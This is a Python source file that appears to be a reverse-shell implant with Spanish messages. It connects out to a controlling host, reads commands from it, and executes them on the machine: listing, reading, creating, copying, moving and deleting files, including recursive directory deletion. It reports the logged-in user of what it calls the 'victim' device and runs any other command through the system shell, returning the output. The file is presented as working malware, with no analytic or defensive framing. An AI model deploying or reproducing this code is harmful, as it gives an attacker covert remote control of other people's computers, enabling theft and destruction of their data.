import socket
import os
import subprocess
import shutil
import re

host = 'localhost'
port = 8080
buffer_size = 15 * 1024
s = socket.socket()

s.connect((host, port))

while True:
    command_upper = s.recv(buffer_size).decode()
    command = str(command_upper.lower())
    
    if command == 'exit':
        s.close()
        break
    elif command == 'pwd':
        result = os.getcwd()
    elif command.startswith('mkdir'):
        pattern = r'^mkdir\s'
        name = re.sub(pattern,'', command_upper)
        result = 'Carpeta creada correctamente!'
        os.mkdir(name)
    elif command == 'ls':
        result_list = os.listdir()
        result = str(result_list)
    elif command.startswith('create'):
        string = re.sub(r'^create ', '', command_upper)
        lista  = string.split('text')
        name = re.sub(f'^[\s]{1,}|\s{1,}$','', lista[0])
        write = re.sub(f'^[\s]{1,}|\s{1,}$','', lista[1])
        with open (name, 'w') as file:
            file.write(write)
            result = 'Elemento creado exitosamente'
    elif command.startswith('delete'):
        pattern = r'^delete\s'
        element = re.sub(pattern,'', command_upper)
        if os.path.exists(element):
            if os.path.isfile(element):
                result = 'Elemento eliminado exitosamente'
                os.remove(element)
            else:
                result = 'El elemento no es un archivo'
        else:
            result = 'El elemento no existe'
    elif command.startswith('cd'):
        pattern = r'^cd\s'
        path_cd = re.sub(pattern,'', command_upper)
        if os.path.exists(path_cd):
            if os.path.isdir(path_cd):
                os.chdir(path_cd)
                result = path_cd
            else:
                result = 'La ruta no es una carpeta'
        else:
            result = 'No se encontró la carpeta especificada.'
        
    elif command.startswith('open'):
        pattern = r'^open\s'
        element = re.sub(pattern,'', command_upper)
        if os.path.exists(element):
            try:
                with open (f'{element}', encoding="UTF-8") as archivo:
                    arch = archivo.read()
                    result = f'\n{arch}\n'
            except:
                result = 'Hubo un error'
        else:
            result = 'No se encontró el archivo, verifique su nombre'
    elif command.startswith('rmdir'):
        pattern = r'^rmdir\s'
        path_dir = re.sub(pattern,'', command_upper)
        if os.path.exists(path_dir):
            if os.path.isdir(path_dir):
                try:
                    result = path_dir
                    os.rmdir(path_dir)
                except:
                    result = path_dir
                    shutil.rmtree(path_dir)
            else:
                result = 'No es un directorio'
        else:
            result = 'No existe esa carpeta'
    elif command.startswith('copy'):
        string = re.sub(r'^copy ', '', command_upper)
        try:
            lista  = string.split(' a ')
            element1 = re.sub(f'^[\s]{1,}|\s{1,}$','', lista[0])
            element2 = re.sub(f'^[\s]{1,}|\s{1,}$','', lista[1])
        except:
            result = 'A ocurrido un error'
        if os.path.exists(element1):
            if os.path.isfile(element1):
                try:
                    shutil.copy2(element1,element2)
                    result = 'Archivo copiado correctamente'
                except:
                    result = 'Ah ocurrido un error'
            else:
                shutil.copytree(element1,element2)
                result = 'Directorio copiado correctamente'
        else:
            result = 'No se encontró la carpeta\archivo especificado.'
    elif command.startswith('move'):
        string = re.sub(r'^move ', '', command_upper)
        try:
            lista  = string.split(' a ')
            element1 = re.sub(f'^[\s]{1,}|\s{1,}$','', lista[0])
            element2 = re.sub(f'^[\s]{1,}|\s{1,}$','', lista[1])
        except:
            result = 'A ocurrido un error'
        if os.path.exists(element1):
            if os.path.isfile(element1):
                try:
                    shutil.move(element1,element2)
                    result = 'Archivo movido correctamente'
                except:
                    result = 'Ah ocurrido un error'
            else:
                result = 'Directorio movido correctamente'
                shutil.move(element1,element2)
        else:
            result = 'No se encontró la carpeta\archivo especificado.'
    elif command.startswith('rename'):
        string = re.sub(r'^rename ', '', command_upper)
        try:
            lista  = string.split(' a ')
            element1 = re.sub(f'^[\s]{1,}|\s{1,}$','', lista[0])
            element2 = re.sub(f'^[\s]{1,}|\s{1,}$','', lista[1])
        except:
            result = 'A ocurrido un error'
        if os.path.exists(element1):
            if os.path.isfile(element1):
                try:
                    os.rename(element1,element2)
                    result = 'Archivo renombrado correctamente'
                except:
                    result = 'Ah ocurrido un error'
            else:
                result = 'Directorio renombrado correctamente'
                os.rename(element1,element2)
        else:
            result = 'No se encontró la carpeta\archivo especificado.'
    elif command.startswith('py -m http.server'):
        string = command_upper
        try:
            lista  = string.split('py -m http.server ')
            port = lista[0]
            result = 'Abriendo servidor local'
            os.system(f'py -m http.server {port}')
        except:
            result = 'A ocurrido un error'
    elif command.startswith('usr'):
        try:
            result = f'El usuario del dispositivo víctima es: {os.getlogin()}'
        except:
            result = 'A ocurrido un error'
    elif command.startswith('dir'):
        try:
            result = subprocess.getoutput(command)
        except:
            result = os.listdir()
    else:
        result = subprocess.getoutput(command)
    s.send(result.encode())